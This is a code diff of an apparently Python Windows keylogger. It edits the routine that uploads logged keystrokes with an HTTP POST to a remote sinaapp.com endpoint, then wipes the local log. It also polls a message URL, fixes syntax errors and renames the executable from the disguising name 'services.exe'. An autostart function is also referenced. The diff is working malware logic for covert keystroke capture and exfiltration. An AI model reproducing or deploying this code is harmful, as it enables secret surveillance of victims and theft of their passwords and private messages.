@@ -28,9 +28,9 @@ psapi = windll.psapi
 current_window = None
 
 old = ' '
-client_id = 'yang-PC'
+client_id = 'test-PC'
 filename = 'log.txt'
-POST_URL = 'http://xxxx.sinaapp.com/action.php'
+POST_URL = 'http://xxxx.sinaapp.com/action.jsp'
 MSG_URL = 'http://xxxx.sinaapp.com/msgbox.txt'
 tittle = u'消息啦'
 
@@ -57,18 +57,21 @@ def http_data():
 			f.close()
 			info = ''.join(lines)
 			if (len(info)> 3):
-                keep = client_id + '@' + time.strftime('%H:%M',time.localtime()
-                data = {'msg':info，'online':keep}
+				keep = client_id + '@' + time.strftime('%H:%M',time.localtime())
+				data = {'msg':info,'on_line':keep}
 				requests.post(POST_URL,data)
 				f = open(filename,'w')
 				f.close()
-            res = urllib.urlopen(MSG_URL).read()
-            user = res.split('@')[0]
-            text = res.split('@')[1]
-            showmsg(user,text)
-        except:
-            time.sleep(200)
-            pass
+			try:
+				res = urllib.urlopen(MSG_URL).read()
+				user = res.split('@')[0]
+				text = res.split('@')[1]
+				showmsg(user,text)
+			except:
+				pass
+		except:
+			time.sleep(200)
+			pass
 
 def get_current_process():
     hwnd = user32.GetForegroundWindow()
@@ -108,7 +111,7 @@ def keyloger():
 	pythoncom.PumpMessages()
 
 def getPath():
-    path=os.getcwd()+'services.exe'
+    path=os.getcwd()+'keyloger_and_msg.exe'
     return path
 	
 def add_start(path):
